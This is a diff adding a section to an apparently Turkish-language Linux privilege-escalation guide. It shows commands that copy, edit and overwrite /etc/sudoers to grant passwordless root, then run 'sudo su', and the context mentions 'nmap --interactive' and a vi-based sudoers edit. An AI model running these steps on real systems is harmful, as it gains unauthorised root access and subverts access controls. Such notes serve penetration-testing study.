@@ -15,3 +15,20 @@ nmap --interactive
 
 `vi /etc/sudoers` dosyasını açıp kullanıcımıza `[kullanici_adi] ALL=(ALL:ALL) ALL NOPASSWD: ALL` şeklinde yetki ekliyoruz. Burada `%admin` ifadesi **admin** grubunu belirtir. Daha sonra **ESC** basıp `wq!` komutunu vi ye veridikten sonra `sudo su` diyerek **root** olabiliyoruz.
 
+### cp ile yetki yükseltme
+
+```shell
+cp /etc/sudoers ~/
+cd ~/ 
+nano sudoers
+```
+
+> root    ALL=(ALL:ALL) ALL NOPASSWD:ALL
+>
+> %sudo   ALL=(ALL:ALL) ALL NOPASSWD:ALL
+
+```bash
+cp sudoers /etc/sudoers
+sudo su 
+```
+
